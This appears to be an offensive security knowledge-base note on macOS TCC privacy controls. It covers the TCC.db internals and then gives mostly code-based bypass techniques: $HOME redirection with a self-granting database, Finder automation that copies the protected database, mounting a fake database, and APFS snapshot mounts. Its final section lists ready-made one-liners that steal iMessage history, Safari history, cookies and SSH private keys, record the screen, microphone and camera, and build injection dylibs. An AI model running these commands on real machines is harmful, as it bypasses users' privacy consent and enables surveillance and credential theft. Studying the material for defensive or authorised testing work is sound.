---
title: "macOS TCC"
type: technique
tags: [macos, tcc, post-exploitation, privesc]
phase: post-exploitation
date_created: 2026-07-14
date_updated: 2026-07-14
sources: [hacktricks-macos]
---

## TCC enumeration and TCC.db internals

TCC (Transparency, Consent, Control) gates app access to privacy resources: contacts, calendar, photos, camera, microphone, screen recording, accessibility, input monitoring, and Full Disk Access. The `tccd` daemon stores grants keyed by Bundle ID plus code-signing requirement (csreq), so a permission is tied to a specific signed binary and is inherited from the responsible parent process. There are two databases: a per-user one (writable with FDA, not SIP protected) and a system one (SIP protected). Both are themselves TCC protected for read, so only an FDA or `kTCCServiceEndpointSecurityClient` process reads them cleanly.

Key `access` table columns: `service` (e.g. `kTCCServiceSystemPolicyAllFiles`), `client` (bundle id or path), `client_type` (0 bundle, 1 path), `auth_value` (0 denied, 1 unknown, 2 allowed, 3 limited), `auth_reason`, `csreq` (signature check blob).

```bash
# Per-user DB (FDA-writable): $HOME/Library/Application Support/com.apple.TCC/TCC.db
# System DB (SIP-protected):  /Library/Application Support/com.apple.TCC/TCC.db
# Location grants:            /var/db/locationd/clients.plist

sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
  "select service, client, auth_value, auth_reason from access;"

# Who has Full Disk Access (best injection targets)
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
  "select client from access where service='kTCCServiceSystemPolicyAllFiles' and auth_value=2;"

# Apps approved for a specific service
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
  "select client from access where service='kTCCServiceScreenCapture' and auth_value=2;"
```

Apple binaries carry pre-granted entitlements that never prompt and never appear in the DB. Enumerate them and reset grants with `tccutil`.

```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
tccutil reset All app.some.bundleid   # reset one app (re-prompt)
tccutil reset All                     # reset everything
```

Build a csreq blob for DB insertion (needed when adding a fake grant with FDA):

```bash
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
echo "X'$(xxd -p /tmp/csreq.bin | tr -d '\n')'"
```

## TCC bypass techniques

TCC never protects writes, only reads, so writing into a protected folder always works even when listing it is denied. Beyond that, the main bypass classes are: mutate the `$HOME`/env that `tccd` trusts, drive an already-permitted app via Automation, inject into a permitted binary, or mount a fresh TCC.db over the protected path.

Write-anywhere primitive (no read grant needed):

```bash
echo asd > ~/Desktop/lalala   # works even when `ls ~/Desktop` = Operation not permitted
```

$HOME mutation (CVE-2020-9934 class): `tccd` reads `$HOME/Library/.../TCC.db`, so redirect launchd's `$HOME` to an attacker directory holding a self-granting DB.

```bash
mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
launchctl setenv HOME /tmp/tccbypass
launchctl stop com.apple.tccd && launchctl start com.apple.tccd
sqlite3 TCC.db "INSERT INTO access VALUES('kTCCServiceSystemPolicyDocumentsFolder','com.apple.Terminal',0,1,1,X'fade0c00...',NULL,NULL,'UNUSED',NULL,NULL,1333333333333337);"
```

Automation over a permitted app (`kTCCServiceAppleEvents`). Finder always has FDA, so an app with AppleEvents over Finder can make Finder copy the protected TCC.db out:

```bash
osascript <<'EOD'
tell application "Finder"
    set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
    set targetFolder to POSIX file "/tmp" as alias
    duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```

Automation over Automator gives arbitrary shell (Automator holds AppleEvents and can run a Run Shell Script action). Automation over System Events plants a Folder Action script reaching Desktop/Documents/Downloads.

Mount a fresh DB over the target dir (CVE-2021-30808 class):

```bash
hdiutil create /tmp/tmp.dmg -size 2m -ov -volname tccbypass -fs APFS
hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg
mkdir -p "/tmp/mnt/Application Support/com.apple.TCC/"
cp /tmp/TCC.db "/tmp/mnt/Application Support/com.apple.TCC/TCC.db"
hdiutil attach -owners off -mountpoint ~/Library/Application\ Support/com.apple.TCC /tmp/tmp.dmg
```

APFS snapshot mount for FDA-app read of the whole disk (CVE-2020-9771):

```bash
tmutil localsnapshot
tmutil listlocalsnapshots /
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap
```

Other env-var openers seen in real CVEs: `launchctl setenv SQLITE_AUTO_TRACE 1` (dumps SQL of TCC-reading apps), `SQLITE_SQLLOG_DIR` (CVE-2023-32422), `MTL_DUMP_PIPELINES_TO_JSON_FILE` (CVE-2023-32407). Behaviour CVEs worth naming: Notes copy (CVE-2021-30761), Music/TV rename race (CVE-2023-38571), Powerdir NFSHomeDirectory (CVE-2021-30970), coreaudiod plugin injection (CVE-2020-29621).

## TCC credential and data theft via injection

Post-exploitation, the strongest move is to inject a dylib (constructor, see [[macos-library-injection]]) into a binary that already holds a TCC grant so the grant is inherited silently, no new prompt. Injectable targets are binaries with `com.apple.security.cs.disable-library-validation` or `...allow-dyld-environment-variables`. Full Disk Access is the crown jewel: it reads iMessage, Safari history, cookies, and SSH keys directly.

Find an injectable binary that already holds a high-value grant, then read the protected files:

```bash
# Enumerate FDA holders, then read their reachable secrets
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
  "select client from access where service='kTCCServiceSystemPolicyAllFiles' and auth_value=2;"

cat ~/Library/Messages/chat.db               # iMessage history
cat ~/Library/Safari/History.db              # Safari browsing history
cat ~/Library/Cookies/Cookies.binarycookies  # browser cookies
cat ~/.ssh/id_rsa                            # SSH private key
```

Ready-made theft one-liners once the injected code runs inside a permitted app:

```bash
cp -r "$HOME/Desktop" /tmp/desktop                              # Desktop grant
cp -r "$HOME/Library/Application Support/AddressBook" /tmp/ab   # Contacts grant
screencapture -V 5 /tmp/screen.mov                             # Screen Recording grant
ffmpeg -f avfoundation -i ":1" -t 5 /tmp/recording.wav         # Microphone grant
ffmpeg -framerate 30 -f avfoundation -i "0" -frames:v 1 /tmp/cap.jpg  # Camera grant
```

Generic dylib build for ObjC/AVFoundation payloads:

```bash
gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m
```

The iCloud entitlement `com.apple.private.icloud-account-access` (see [[macos-code-signing]]) reaches the `com.apple.iCloudHelper` XPC service for tokens (iMovie/GarageBand historically had it).
